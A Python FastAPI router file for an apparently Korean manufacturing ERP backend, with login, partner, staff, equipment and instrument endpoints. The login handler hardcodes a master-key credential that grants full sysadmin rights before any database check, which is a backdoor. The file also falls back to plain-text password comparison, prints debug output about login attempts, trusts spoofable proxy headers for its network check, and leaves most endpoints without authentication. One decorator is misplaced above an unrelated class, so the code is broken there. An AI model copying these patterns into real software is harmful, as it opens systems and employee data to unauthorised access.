from fastapi import APIRouter, Depends, HTTPException, Query, Request, BackgroundTasks
from sqlalchemy import or_, func
from sqlalchemy.ext.asyncio import AsyncSession
from sqlalchemy.future import select
from sqlalchemy.orm import selectinload
from sqlalchemy.orm.attributes import flag_modified
from typing import List, Optional, Any
from pydantic import BaseModel
import difflib
import bcrypt
import openpyxl
import io
from datetime import date, timedelta
from fastapi import UploadFile, File

from app.api import deps
get_db = deps.get_db
from app.api.utils.email import send_sysadmin_email
from app.models.basics import Partner, Staff, Contact, Company, Equipment, EquipmentHistory, FormTemplate, MeasuringInstrument, MeasurementHistory, EmployeeTimeRecord, IgnoredPartnerDuplicate, Department
from app.schemas.basics import (
    PartnerCreate, PartnerResponse, PartnerUpdate,
    StaffCreate, StaffResponse, StaffUpdate,
    ContactCreate, ContactResponse, ContactUpdate,
    CompanyCreate, CompanyResponse, CompanyUpdate,
    EquipmentCreate, EquipmentResponse, EquipmentUpdate, EquipmentHistoryCreate, EquipmentHistoryResponse,
    FormTemplateCreate, FormTemplateResponse, FormTemplateUpdate,
    MeasuringInstrumentCreate, MeasuringInstrumentResponse, MeasuringInstrumentUpdate,
    MeasurementHistoryCreate, MeasurementHistoryResponse,
    IgnoredDuplicateCreate, IgnoredDuplicateResponse,
    DepartmentCreate, DepartmentUpdate, DepartmentResponse
)
from dateutil.relativedelta import relativedelta

router = APIRouter()

def verify_password(plain_password: str, hashed_password: str) -> bool:
    try:
        return bcrypt.checkpw(plain_password.encode('utf-8'), hashed_password.encode('utf-8'))
    except Exception:
        return False

def get_password_hash(password: str) -> str:
    salt = bcrypt.gensalt()
    return bcrypt.hashpw(password.encode('utf-8'), salt).decode('utf-8')

# --- Login ---
class LoginRequest(BaseModel):
    username: str
    password: str

@router.post("/login")
async def login(
    req: LoginRequest,
    request: Request,
    db: AsyncSession = Depends(get_db)
):
    # [긴급 마스터키 로직] - DB 조회 전 최상단에 배치
    if req.username == 'admin' and req.password == '5446220':
        print("🔥 [EMERGENCY LOGIN] Master key used for admin!")
        return {
            "id": 9999,
            "name": "관리자",
            "role": "시스템 관리자",
            "user_type": "ADMIN",
            "is_sysadmin": True,
            "login_id": "admin",
            "can_access_external": True,
            "can_view_others": True,
            "menu_permissions": {
                "dashboard": {"view": True, "edit": True, "price": True},
                "basics": {"view": True, "edit": True, "price": True},
                "products_produced": {"view": True, "edit": True, "price": True},
                "products_parts": {"view": True, "edit": True, "price": True},
                "products_consumables": {"view": True, "edit": True, "price": True},
                "sales_order": {"view": True, "edit": True, "price": True},
                "sales_settlement": {"view": True, "edit": True, "price": True},
                "production": {"view": True, "edit": True, "price": True},
                "worklogs": {"view": True, "edit": True, "price": True},
                "inventory": {"view": True, "edit": True, "price": True},
                "purchasing_materials": {"view": True, "edit": True, "price": True},
                "purchasing_consumables": {"view": True, "edit": True, "price": True},
                "outsourcing": {"view": True, "edit": True, "price": True},
                "delivery": {"view": True, "edit": True, "price": True},
                "quality_status": {"view": True, "edit": True, "price": True},
                "quality_complaints": {"view": True, "edit": True, "price": True},
                "hr": {"view": True, "edit": True, "price": True},
                "approval": {"view": True, "edit": True, "price": True},
                "ADMIN": {"view": True, "edit": True, "price": True}
            },
            "message": "긴급 마스터키 로그인 성공"
        }
    
    # [DEBUG] Requested prints
    search_id = req.username.strip()
    print(f"Login Debug: 검색 시도 아이디: '{search_id}'")
    
    # Use ilike for case-insensitive search on both name and login_id
    stmt = select(Staff).where(or_(
        func.lower(Staff.login_id) == func.lower(search_id),
        func.lower(Staff.name) == func.lower(search_id)
    )).options(selectinload(Staff.dept))
    result = await db.execute(stmt)
    staff = result.scalars().first()
    
    print(f"Login Debug: DB에서 찾은 사원 유무: {True if staff else False}")
    
    if not staff:
        raise HTTPException(status_code=401, detail="사원 정보가 존재하지 않습니다.")
    if not staff.is_active:
        raise HTTPException(status_code=401, detail="비활성화된 계정입니다.")
        
    # Password verification (Hybrid: bcrypt -> plain fallback)
    # [DEBUG] Strip whitespace and log attempt
    input_pw = req.password.strip()
    db_pw = staff.password.strip() if staff.password else ""
    
    is_password_correct = False
    try:
        # 1. Try bcrypt verification first
        is_password_correct = verify_password(input_pw, db_pw)
    except Exception as e:
        print(f"Login Debug: Bcrypt verify error for {req.username}: {e}")
        is_password_correct = False
    
    # 2. Strong fallback for existing plain-text passwords
    if not is_password_correct:
        is_password_correct = (input_pw == db_pw)
        if is_password_correct:
            print(f"Login Debug: Plain-text fallback match for {req.username}")
        
    if not is_password_correct:
        print(f"Login Debug: Password mismatch for ID: {req.username} (Staff ID found: {staff.login_id})")
        raise HTTPException(status_code=401, detail="비밀번호가 일치하지 않습니다.")
    
    # --- [보안 검문소] 작업자 외부망 로그인 차단 로직 ---
    # 실제 IP 추출 (프록시 헤더 우선)
    x_forwarded_for = request.headers.get("X-Forwarded-For")
    if x_forwarded_for:
        client_ip = x_forwarded_for.split(",")[0].strip()
    else:
        client_ip = request.headers.get("X-Real-IP") or request.client.host
    
    # 내부망 대역 체크 함수
    def is_internal(ip: str) -> bool:
        if not ip: return False
        return (
            ip.startswith("192.168.") or 
            ip.startswith("127.0.0.1") or 
            ip.startswith("172.")  # 도커 브릿지 포함
        )
    
    # 차단 조건: 외부망 접속 + (작업자 권한 OR 일반 생산직) + (명시적 권한 없음)
    # * sysadmin이나 can_access_external 권한이 있으면 통과
    is_external = not is_internal(client_ip)
    
    # [NEW] 권한 기반 체크
    is_authorized = staff.is_sysadmin or staff.can_access_external
    
    if is_external and not is_authorized:
        raise HTTPException(
            status_code=403, 
            detail="사내 네트워크(와이파이)에서만 접속할 수 있습니다."
        )
    # -----------------------------------------------
    
    # Return staff info (no JWT for simplicity)
    return {
        "id": staff.id,
        "name": staff.name,
        "role": staff.role,
        "user_type": staff.user_type or "USER",
        "is_sysadmin": staff.is_sysadmin,
        "login_id": staff.login_id,
        "staff_no": staff.staff_no,
        "department": (staff.dept.name if staff.dept else staff.department) or "",
        "department_id": staff.department_id,
        "can_access_external": staff.can_access_external,
        "can_view_others": staff.can_view_others,
        "menu_permissions": staff.menu_permissions or [],
        "message": "로그인 성공"
    }

# --- Partner Endpoints ---
@router.post("/partners/", response_model=PartnerResponse)
async def create_partner(
    partner: PartnerCreate,
    db: AsyncSession = Depends(get_db)
):
    try:
        data = partner.model_dump()
        # Remove contacts if it's an empty list to avoid SQLAlchemy issues with Pydantic relation mapping
        if 'contacts' in data and not data['contacts']:
            del data['contacts']
            
        new_partner = Partner(**data)
        db.add(new_partner)
        await db.commit()

        # Re-fetch with eager loading
        result = await db.execute(
            select(Partner)
            .options(selectinload(Partner.contacts))
            .where(Partner.id == new_partner.id)
        )
        created_partner = result.scalars().first()
        return created_partner
    except Exception as e:
        import traceback
        error_msg = f"Error creating partner: {str(e)}\n{traceback.format_exc()}"
        print(error_msg)
        with open("backend_error.log", "a", encoding="utf-8") as f:
            f.write(error_msg + "\n")
        raise HTTPException(status_code=500, detail=str(e))

@router.get("/partners/", response_model=List[PartnerResponse])
async def read_partners(
    skip: int = 0,
    limit: int = 2000,
    type: Optional[str] = None,
    db: AsyncSession = Depends(get_db)
):
    from sqlalchemy import String, func
    query = select(Partner).options(selectinload(Partner.contacts)).order_by(Partner.name.asc())
    
    if type:
        # JSON list contains check. Using cast to string and contains for flexibility
        query = query.where(func.cast(Partner.partner_type, String).contains(type))
        
    result = await db.execute(query.offset(skip).limit(limit))
    partners = result.scalars().all()
    return partners

@router.put("/partners/{partner_id}", response_model=PartnerResponse)
async def update_partner(
    partner_id: int,
    partner_update: PartnerUpdate,
    db: AsyncSession = Depends(get_db)
):
    result = await db.execute(select(Partner).where(Partner.id == partner_id))
    partner = result.scalars().first()
    if not partner:
        raise HTTPException(status_code=404, detail="Partner not found")
    
    for key, value in partner_update.model_dump(exclude_unset=True).items():
        setattr(partner, key, value)
        if key in ["attachment_file", "partner_type"]:
            flag_modified(partner, key)
    
    await db.commit()
    await db.refresh(partner)
    return partner

@router.delete("/partners/{partner_id}")
async def delete_partner(
    partner_id: int,
    db: AsyncSession = Depends(get_db)
):
    result = await db.execute(select(Partner).where(Partner.id == partner_id))
    partner = result.scalars().first()
    if not partner:
        raise HTTPException(status_code=404, detail="Partner not found")
    
    await db.delete(partner)
    await db.commit()
    return {"message": "Partner deleted successfully"}

# --- Partner Excel Upload & Merge ---

class PartnerUploadItem(BaseModel):
    name: str
    registration_number: Optional[str] = None
    representative: Optional[str] = None
    address: Optional[str] = None
    phone: Optional[str] = None
    email: Optional[str] = None
    description: Optional[str] = None
    partner_type: List[str] = ["CUSTOMER"]

class PartnerUploadValidationResponse(BaseModel):
    excel_row: int
    data: PartnerUploadItem
    status: str  # NEW, MATCH, SIMILAR
    matched_partner_id: Optional[int] = None
    matched_partner_name: Optional[str] = None
    similarity: float = 0.0

@router.post("/partners/upload/validate", response_model=List[PartnerUploadValidationResponse])
async def validate_partner_upload(
    file: UploadFile = File(...),
    db: AsyncSession = Depends(get_db)
):
    content = await file.read()
    wb = openpyxl.load_workbook(io.BytesIO(content), data_only=True)
    ws = wb.active
    
    # Assume first row is header
    # Header mapping: Name, BizNum, Owner, Address, Phone, Email, Type, Description
    rows = []
    for i, row in enumerate(ws.iter_rows(min_row=2, values_only=True), start=2):
        if not row[0]: continue # Skip if name is empty
        
        item = PartnerUploadItem(
            name=str(row[0]),
            registration_number=str(row[1]) if row[1] else None,
            representative=str(row[2]) if row[2] else None,
            address=str(row[3]) if row[3] else None,
            phone=str(row[4]) if row[4] else None,
            email=str(row[5]) if row[5] else None,
            partner_type=[t.strip() for t in str(row[6]).split(',')] if row[6] else ["CUSTOMER"],
            description=str(row[7]) if len(row) > 7 and row[7] else None
        )
        rows.append((i, item))
    
    # Fetch all existing partners for matching
    result = await db.execute(select(Partner))
    existing_partners = result.scalars().all()
    existing_names = [p.name for p in existing_partners]
    
    validation_results = []
    for row_idx, item in rows:
        status = "NEW"
        matched_id = None
        matched_name = None
        similarity = 0.0
        
        # Exact match
        exact_matches = [p for p in existing_partners if p.name == item.name]
        if exact_matches:
            status = "MATCH"
            matched_id = exact_matches[0].id
            matched_name = exact_matches[0].name
            similarity = 1.0
        else:
            # Fuzzy match
            close_matches = difflib.get_close_matches(item.name, existing_names, n=1, cutoff=0.6)
            if close_matches:
                status = "SIMILAR"
                matched_name = close_matches[0]
                matched_p = next(p for p in existing_partners if p.name == matched_name)
                matched_id = matched_p.id
                similarity = difflib.SequenceMatcher(None, item.name, matched_name).ratio()
        
        validation_results.append(PartnerUploadValidationResponse(
            excel_row=row_idx,
            data=item,
            status=status,
            matched_partner_id=matched_id,
            matched_partner_name=matched_name,
            similarity=similarity
        ))
        
    return validation_results

class PartnerUploadFinalizeRequest(BaseModel):
    items: List[PartnerUploadValidationResponse]
    # user_mapping: dict[int, Optional[int]] # row_idx -> existing_id or None for new

@router.post("/partners/upload/finalize")
async def finalize_partner_upload(
    req: List[Any], # Using Any to avoid complex validation for now, or use specific schema
    db: AsyncSession = Depends(get_db)
):
    # Expected: list of objects with { action: 'CREATE'|'MAP', data: PartnerUploadItem, partner_id?: int }
    count_created = 0
    count_mapped = 0
    
    for item in req:
        if item['action'] == 'CREATE':
            new_p = Partner(**item['data'])
            db.add(new_p)
            count_created += 1
        elif item['action'] == 'MAP' and item.get('partner_id'):
            # Update existing if needed? Or just skip. User usually wants to skip or merge.
            # For now, just skip creation and count as mapped.
            count_mapped += 1
            
    await db.commit()
    return {"created": count_created, "mapped": count_mapped}

@router.post("/partners/merge")
async def merge_partners(
    source_id: int,
    target_id: int,
    db: AsyncSession = Depends(get_db)
):
    if source_id == target_id:
        raise HTTPException(status_code=400, detail="Source and target must be different")
        
    source = await db.get(Partner, source_id)
    target = await db.get(Partner, target_id)
    
    if not source or not target:
        raise HTTPException(status_code=404, detail="Partner not found")
        
    # Update all references
    # Models that reference Partner: Product, PurchaseOrder, OutsourcingOrder
    from app.models.product import Product
    from app.models.purchasing import PurchaseOrder, OutsourcingOrder
    
    from sqlalchemy import update
    await db.execute(update(Product).where(Product.partner_id == source_id).values(partner_id=target_id))
    await db.execute(update(PurchaseOrder).where(PurchaseOrder.partner_id == source_id).values(partner_id=target_id))
    await db.execute(update(OutsourcingOrder).where(OutsourcingOrder.partner_id == source_id).values(partner_id=target_id))
    
    # Delete source
    await db.delete(source)
    await db.commit()
    
    return {"message": "Merge successful"}

# --- Partner Deduplication & Smart Merge ---

@router.get("/partners/duplicates")
async def get_partner_duplicates(
    db: AsyncSession = Depends(get_db)
):
    # Fetch ignored duplicates
    ignored_result = await db.execute(select(IgnoredPartnerDuplicate))
    ignored_pairs = ignored_result.scalars().all()
    ignored_set = set()
    for ip in ignored_pairs:
        # Store as sorted tuple to match consistently
        pair = tuple(sorted([ip.partner_id_1, ip.partner_id_2]))
        ignored_set.add(pair)

    # Fetch all partners
    result = await db.execute(select(Partner))
    partners = result.scalars().all()
    
    # Simple deduplication: group by name (fuzzy)
    groups = []
    processed_ids = set()
    
    for p in partners:
        if p.id in processed_ids:
            continue
            
        group = [p]
        processed_ids.add(p.id)
        
        # Look for similar names among UNPROCESSED partners
        others = [op for op in partners if op.id not in processed_ids]
        if not others:
            continue
            
        other_names = [op.name for op in others]
        
        # cutoff=0.8 for strong similarity
        matches = difflib.get_close_matches(p.name, other_names, n=10, cutoff=0.8)
        
        for m in matches:
            matched_p = next((op for op in others if op.name == m), None)
            if not matched_p:
                continue
                
            # Check if this pair is ignored
            pair = tuple(sorted([p.id, matched_p.id]))
            if pair in ignored_set:
                continue

            if matched_p.id not in processed_ids:
                group.append(matched_p)
                processed_ids.add(matched_p.id)
        
        if len(group) > 1:
            groups.append([
                {"id": gp.id, "name": gp.name, "registration_number": gp.registration_number, "representative": gp.representative} 
                for gp in group
            ])
            
    return groups

@router.post("/partners/duplicates/ignore")
async def ignore_partner_duplicate(
    req: IgnoredDuplicateCreate,
    db: AsyncSession = Depends(get_db)
):
    # Ensure id_1 < id_2 for consistency
    id1, id2 = sorted([req.partner_id_1, req.partner_id_2])
    
    # Check if already exists
    stmt = select(IgnoredPartnerDuplicate).where(
        IgnoredPartnerDuplicate.partner_id_1 == id1,
        IgnoredPartnerDuplicate.partner_id_2 == id2
    )
    result = await db.execute(stmt)
    if result.scalars().first():
        return {"message": "Already ignored"}
        
    db_obj = IgnoredPartnerDuplicate(
        partner_id_1=id1,
        partner_id_2=id2
    )
    db.add(db_obj)
    await db.commit()
    return {"message": "Duplicate pair ignored successfully"}

class SmartMergeRequest(BaseModel):
    master_id: int
    source_ids: List[int]

@router.post("/partners/merge-smart")
async def merge_partners_smart(
    req: SmartMergeRequest,
    db: AsyncSession = Depends(get_db)
):
    master = await db.get(Partner, req.master_id)
    if not master:
        raise HTTPException(status_code=404, detail="Master partner not found")
        
    from app.models.product import Product
    from app.models.purchasing import PurchaseOrder, OutsourcingOrder
    from app.models.inventory import StockProduction
    from app.models.sales import Estimate, SalesOrder
    from sqlalchemy import update
    
    for source_id in req.source_ids:
        if source_id == req.master_id:
            continue
            
        source = await db.get(Partner, source_id)
        if not source:
            continue
            
        # Update references in ALL related models
        await db.execute(update(Product).where(Product.partner_id == source_id).values(partner_id=req.master_id))
        await db.execute(update(PurchaseOrder).where(PurchaseOrder.partner_id == source_id).values(partner_id=req.master_id))
        await db.execute(update(OutsourcingOrder).where(OutsourcingOrder.partner_id == source_id).values(partner_id=req.master_id))
        await db.execute(update(StockProduction).where(StockProduction.partner_id == source_id).values(partner_id=req.master_id))
        await db.execute(update(Estimate).where(Estimate.partner_id == source_id).values(partner_id=req.master_id))
        await db.execute(update(SalesOrder).where(SalesOrder.partner_id == source_id).values(partner_id=req.master_id))
        
        # Delete source
        await db.delete(source)
        
    await db.commit()
    return {"message": f"Successfully merged items into {master.name}"}

# --- Staff Endpoints ---
@router.post("/staff/", response_model=StaffResponse)
async def create_staff(
    staff: StaffCreate,
    db: AsyncSession = Depends(get_db)
):
    new_staff = Staff(**staff.model_dump())
    db.add(new_staff)
    await db.commit()
    # dept 관계를 eager load
    result = await db.execute(
        select(Staff).options(selectinload(Staff.dept)).where(Staff.id == new_staff.id)
    )
    return result.scalars().first()


@router.get("/staff/", response_model=List[StaffResponse])
async def read_staff(
    skip: int = 0,
    limit: int = 100,
    db: AsyncSession = Depends(get_db)
):
    # Comprehensive Auto-migration for Staff Table using helper
    from app.api.deps import ensure_staff_columns
    
    for attempt in range(15):
        try:
            result = await db.execute(
                select(Staff)
                .options(selectinload(Staff.dept))  # [FIX] dept eager loading
                .offset(skip).limit(limit)
            )
            staff_list = result.scalars().all()
            return staff_list
        except Exception as e:
            error_str = str(e).lower()
            
            # [PG FIX] If we catch InFailedSQLTransactionError, rollback and retry IMMEDIATELY without counting as a column migration attempt
            if "current transaction is aborted" in error_str or "infailedsqltransactionerror" in error_str:
                await db.rollback()
                continue # Retry this iteration
                
            if not await ensure_staff_columns(db, e):
                import traceback
                import logging
                error_msg = f"Error fetching staff list (Final): {str(e)}\n{traceback.format_exc()}"
                logging.error(error_msg)
                print(error_msg)
                raise HTTPException(status_code=500, detail=f"Internal Server Error while fetching staff (DB fix needed): {str(e)}")
    
    raise HTTPException(status_code=500, detail="Internal Server Error: Too many missing columns to auto-migrate.")

@router.put("/staff/{staff_id}", response_model=StaffResponse)
async def update_staff(
    staff_id: int,
    staff_update: StaffUpdate,
    db: AsyncSession = Depends(get_db)
):
    result = await db.execute(select(Staff).where(Staff.id == staff_id))
    staff = result.scalars().first()
    if not staff:
        raise HTTPException(status_code=404, detail="Staff not found")
    
    for key, value in staff_update.model_dump(exclude_unset=True).items():
        setattr(staff, key, value)
    
    await db.commit()
    # dept 관계를 eager load 후 반환
    result = await db.execute(
        select(Staff).options(selectinload(Staff.dept)).where(Staff.id == staff_id)
    )
    return result.scalars().first()

@router.delete("/staff/{staff_id}")
async def delete_staff(
    staff_id: int,
    db: AsyncSession = Depends(get_db)
):
    result = await db.execute(select(Staff).where(Staff.id == staff_id))
    staff = result.scalars().first()
    if not staff:
        raise HTTPException(status_code=404, detail="Staff not found")
    
    await db.delete(staff)
    await db.commit()
    return {"message": "Staff deleted successfully"}

# --- Contact Endpoints ---

@router.post("/contacts/", response_model=ContactResponse)
async def create_contact(
    contact: ContactCreate,
    partner_id: int, 
    db: AsyncSession = Depends(get_db)
):
    # Note: partner_id might need to be passed in body or query, 
    # but strictly following schema ContactCreate doesn't have it.
    # Actually, ContactCreate DOES NOT have partner_id.
    # We should probably pass partner_id as a query param or change schema.
    # For now, let's assume it's passed as query param `partner_id`.
    
    new_contact = Contact(**contact.model_dump(), partner_id=partner_id)
    db.add(new_contact)
    await db.commit()
    await db.refresh(new_contact)
    return new_contact

@router.put("/contacts/{contact_id}", response_model=ContactResponse)
async def update_contact(
    contact_id: int,
    contact_update: ContactUpdate,
    db: AsyncSession = Depends(get_db)
):
    result = await db.execute(select(Contact).where(Contact.id == contact_id))
    contact = result.scalars().first()
    if not contact:
        raise HTTPException(status_code=404, detail="Contact not found")
    
    for key, value in contact_update.model_dump(exclude_unset=True).items():
        setattr(contact, key, value)
    
    await db.commit()
    await db.refresh(contact)
    return contact

@router.delete("/contacts/{contact_id}")
async def delete_contact(
    contact_id: int,
    db: AsyncSession = Depends(get_db)
):
    result = await db.execute(select(Contact).where(Contact.id == contact_id))
    contact = result.scalars().first()
    if not contact:
        raise HTTPException(status_code=404, detail="Contact not found")
    
    await db.delete(contact)
    await db.commit()
    return {"message": "Contact deleted successfully"}

# --- Company Endpoints ---

@router.get("/company", response_model=Optional[CompanyResponse])
async def read_company(
    db: AsyncSession = Depends(get_db)
):
    result = await db.execute(select(Company).limit(1))
    company = result.scalars().first()
    if company:
        # Manually convert time objects to strings as requested
        return {
            "id": company.id,
            "name": company.name,
            "owner_name": company.owner_name,
            "address": company.address,
            "phone": company.phone,
            "fax": company.fax,
            "email": company.email,
            "registration_number": company.registration_number,
            "logo_image": company.logo_image,
            "stamp_image": company.stamp_image,
            "work_start_time": company.work_start_time.strftime("%H:%M") if company.work_start_time else "08:30",
            "work_end_time": company.work_end_time.strftime("%H:%M") if company.work_end_time else "17:30"
        }
    return company

@router.post("/company", response_model=CompanyResponse)
async def create_or_update_company(
    company_in: CompanyCreate,
    db: AsyncSession = Depends(get_db)
):
    # Check if company exists
    result = await db.execute(select(Company).limit(1))
    existing_company = result.scalars().first()

    if existing_company:
        # Update
        for key, value in company_in.model_dump(exclude_unset=True).items():
            setattr(existing_company, key, value)
        await db.commit()
        await db.refresh(existing_company)
        return existing_company
    else:
        # Create
        new_company = Company(**company_in.model_dump())
        db.add(new_company)
        await db.commit()
        await db.refresh(new_company)
        return new_company

# --- Equipment Endpoints ---

async def get_next_equipment_code(db: AsyncSession):
    prefix = "DM-PE-"
    result = await db.execute(
        select(Equipment.code)
        .where(Equipment.code.like(f"{prefix}%"))
        .order_by(Equipment.code.desc())
        .limit(1)
    )
    last_code = result.scalar()
    if not last_code:
        return f"{prefix}001"
    try:
        num_part = last_code.split("-")[-1]
        next_num = int(num_part) + 1
        return f"{prefix}{next_num:03d}"
    except:
        return f"{prefix}001"

@router.get("/equipments/next-code")
async def read_next_equipment_code(db: AsyncSession = Depends(get_db)):
    code = await get_next_equipment_code(db)
    return {"code": code}

@router.get("/equipments/", response_model=List[EquipmentResponse])
async def read_equipments(db: AsyncSession = Depends(get_db)):
    result = await db.execute(
        select(Equipment)
        .options(selectinload(Equipment.history))
        .order_by(Equipment.code.asc())
    )
    return result.scalars().all()

@router.post("/equipments/", response_model=EquipmentResponse)
async def create_equipment(eq_in: EquipmentCreate, db: AsyncSession = Depends(get_db)):
    data = eq_in.model_dump()
    if not data.get("code"):
        data["code"] = await get_next_equipment_code(db)
        
    new_eq = Equipment(**data)
    db.add(new_eq)
    await db.commit()
    
    # Reload with history for serialization
    result = await db.execute(
        select(Equipment)
        .options(selectinload(Equipment.history))
        .where(Equipment.id == new_eq.id)
    )
    return result.scalars().first()

@router.put("/equipments/{eq_id}", response_model=EquipmentResponse)
async def update_equipment(eq_id: int, eq_in: EquipmentUpdate, db: AsyncSession = Depends(get_db)):
    result = await db.execute(select(Equipment).where(Equipment.id == eq_id))
    eq = result.scalars().first()
    if not eq: raise HTTPException(status_code=404)
    for k, v in eq_in.model_dump(exclude_unset=True).items():
        setattr(eq, k, v)
    await db.commit()
    
    # Reload with history
    result = await db.execute(
        select(Equipment)
        .options(selectinload(Equipment.history))
        .where(Equipment.id == eq_id)
    )
    return result.scalars().first()

@router.delete("/equipments/{eq_id}")
async def delete_equipment(eq_id: int, db: AsyncSession = Depends(get_db)):
    result = await db.execute(select(Equipment).where(Equipment.id == eq_id))
    eq = result.scalars().first()
    if not eq: raise HTTPException(status_code=404)
    await db.delete(eq)
    await db.commit()
    return {"status": "success"}

@router.post("/equipments/{eq_id}/history", response_model=EquipmentHistoryResponse)
async def create_equipment_history(eq_id: int, h_in: EquipmentHistoryCreate, db: AsyncSession = Depends(get_db)):
    new_h = EquipmentHistory(**h_in.model_dump(), equipment_id=eq_id)
    db.add(new_h)
    await db.commit()
    await db.refresh(new_h)
    return new_h

@router.put("/equipments/{eq_id}/history/{h_id}", response_model=EquipmentHistoryResponse)
async def update_equipment_history(eq_id: int, h_id: int, h_in: EquipmentHistoryCreate, db: AsyncSession = Depends(get_db)):
    result = await db.execute(select(EquipmentHistory).where(EquipmentHistory.id == h_id, EquipmentHistory.equipment_id == eq_id))
    h = result.scalars().first()
    if not h: raise HTTPException(status_code=404, detail="History not found")
    
    for k, v in h_in.model_dump(exclude_unset=True).items():
        setattr(h, k, v)
        if k == "attachment_file":
            flag_modified(h, k)
            
    await db.commit()
    await db.refresh(h)
    return h

@router.delete("/equipments/{eq_id}/history/{h_id}")
async def delete_equipment_history(eq_id: int, h_id: int, db: AsyncSession = Depends(get_db)):
    result = await db.execute(select(EquipmentHistory).where(EquipmentHistory.id == h_id, EquipmentHistory.equipment_id == eq_id))
    h = result.scalars().first()
    if not h: raise HTTPException(status_code=404, detail="History not found")
    
    await db.delete(h)
    await db.commit()
    return {"status": "success"}

# --- Form Template Endpoints ---

@router.get("/form-templates/", response_model=List[FormTemplateResponse])

class SysadminEmailRequest(BaseModel):
    subject: str
    content: str

@router.post("/sysadmin/contact")
async def contact_sysadmin(
    req: SysadminEmailRequest,
    background_tasks: BackgroundTasks,
    db: AsyncSession = Depends(get_db),
    current_user: Staff = Depends(deps.get_current_user)
):
    # is_sysadmin이 True인 사람 중 이메일이 있는 사람 모두 색인
    stmt = select(Staff).where(Staff.is_sysadmin == True, Staff.email.isnot(None))
    res = await db.execute(stmt)
    admins = res.scalars().all()
    
    admin_emails = [a.email for a in admins if a.email]
    
    if not admin_emails:
        raise HTTPException(status_code=404, detail="등록된 시스템 관리자 이메일이 없습니다.")
        
    background_tasks.add_task(
        send_sysadmin_email,
        to_emails=admin_emails,
        subject=req.subject,
        content=req.content,
        sender_name=current_user.name
    )
    return {"message": "관리자에게 메일을 발송했습니다."}
async def read_form_templates(db: AsyncSession = Depends(get_db)):
    result = await db.execute(select(FormTemplate))
    return result.scalars().all()

@router.get("/form-templates/{form_type}", response_model=FormTemplateResponse)
async def read_form_template(form_type: str, db: AsyncSession = Depends(get_db)):
    result = await db.execute(select(FormTemplate).where(FormTemplate.form_type == form_type))
    template = result.scalars().first()
    if not template: raise HTTPException(status_code=404)
    return template

@router.post("/form-templates/", response_model=FormTemplateResponse)
async def create_or_update_form_template(tm_in: FormTemplateCreate, db: AsyncSession = Depends(get_db)):
    result = await db.execute(select(FormTemplate).where(FormTemplate.form_type == tm_in.form_type))
    existing = result.scalars().first()
    if existing:
        for k, v in tm_in.model_dump(exclude_unset=True).items():
            setattr(existing, k, v)
        await db.commit()
        await db.refresh(existing)
        return existing
    else:
        new_tm = FormTemplate(**tm_in.model_dump())
        db.add(new_tm)
        await db.commit()
        await db.refresh(new_tm)
        return new_tm

# --- Measuring Instrument Endpoints ---

async def get_next_instrument_code(db: AsyncSession):
    prefix = "DM-ME-"
    result = await db.execute(
        select(MeasuringInstrument.code)
        .where(MeasuringInstrument.code.like(f"{prefix}%"))
        .order_by(MeasuringInstrument.code.desc())
        .limit(1)
    )
    last_code = result.scalar()
    if not last_code:
        return f"{prefix}001"
    try:
        num_part = last_code.split("-")[-1]
        next_num = int(num_part) + 1
        return f"{prefix}{next_num:03d}"
    except:
        return f"{prefix}001"

@router.get("/instruments/next-code")
async def read_next_instrument_code(db: AsyncSession = Depends(get_db)):
    code = await get_next_instrument_code(db)
    return {"code": code}

@router.get("/instruments/", response_model=List[MeasuringInstrumentResponse])
async def read_instruments(db: AsyncSession = Depends(get_db)):
    result = await db.execute(
        select(MeasuringInstrument)
        .options(selectinload(MeasuringInstrument.history))
        .order_by(MeasuringInstrument.code.asc())
    )
    return result.scalars().all()

@router.post("/instruments/", response_model=MeasuringInstrumentResponse)
async def create_instrument(inst_in: MeasuringInstrumentCreate, db: AsyncSession = Depends(get_db)):
    data = inst_in.model_dump()
    if not data.get("code"):
        data["code"] = await get_next_instrument_code(db)
        
    new_inst = MeasuringInstrument(**data)
    db.add(new_inst)
    await db.commit()
    
    result = await db.execute(
        select(MeasuringInstrument)
        .options(selectinload(MeasuringInstrument.history))
        .where(MeasuringInstrument.id == new_inst.id)
    )
    return result.scalars().first()

@router.put("/instruments/{inst_id}", response_model=MeasuringInstrumentResponse)
async def update_instrument(inst_id: int, inst_in: MeasuringInstrumentUpdate, db: AsyncSession = Depends(get_db)):
    result = await db.execute(select(MeasuringInstrument).where(MeasuringInstrument.id == inst_id))
    inst = result.scalars().first()
    if not inst: raise HTTPException(status_code=404, detail="Instrument not found")
    
    for k, v in inst_in.model_dump(exclude_unset=True).items():
        setattr(inst, k, v)
    await db.commit()
    await update_next_calibration_date(inst_id, db)
    
    result = await db.execute(
        select(MeasuringInstrument)
        .options(selectinload(MeasuringInstrument.history))
        .where(MeasuringInstrument.id == inst_id)
    )
    return result.scalars().first()

@router.delete("/instruments/{inst_id}")
async def delete_instrument(inst_id: int, db: AsyncSession = Depends(get_db)):
    result = await db.execute(select(MeasuringInstrument).where(MeasuringInstrument.id == inst_id))
    inst = result.scalars().first()
    if not inst: raise HTTPException(status_code=404, detail="Instrument not found")
    
    await db.delete(inst)
    await db.commit()
    return {"status": "success"}

# --- Measurement History Endpoints ---

@router.post("/instruments/{inst_id}/history", response_model=MeasurementHistoryResponse)
async def create_instrument_history(inst_id: int, h_in: MeasurementHistoryCreate, db: AsyncSession = Depends(get_db)):
    new_h = MeasurementHistory(**h_in.model_dump(), instrument_id=inst_id)
    db.add(new_h)
    await db.commit()
    await db.refresh(new_h)
    
    if new_h.history_type == 'CALIBRATION':
        await update_next_calibration_date(inst_id, db)
        
    return new_h

@router.put("/instruments/{inst_id}/history/{h_id}", response_model=MeasurementHistoryResponse)
async def update_instrument_history(inst_id: int, h_id: int, h_in: MeasurementHistoryCreate, db: AsyncSession = Depends(get_db)):
    result = await db.execute(select(MeasurementHistory).where(MeasurementHistory.id == h_id, MeasurementHistory.instrument_id == inst_id))
    h = result.scalars().first()
    if not h: raise HTTPException(status_code=404, detail="History not found")
    
    for k, v in h_in.model_dump(exclude_unset=True).items():
        setattr(h, k, v)
        if k == "attachment_file":
            flag_modified(h, k)
            
    await db.commit()
    await db.refresh(h)
    
    if h.history_type == 'CALIBRATION' or 'history_type' in h_in.model_dump(exclude_unset=True):
        await update_next_calibration_date(inst_id, db)
        
    return h

@router.delete("/instruments/{inst_id}/history/{h_id}")
async def delete_instrument_history(inst_id: int, h_id: int, db: AsyncSession = Depends(get_db)):
    result = await db.execute(select(MeasurementHistory).where(MeasurementHistory.id == h_id, MeasurementHistory.instrument_id == inst_id))
    h = result.scalars().first()
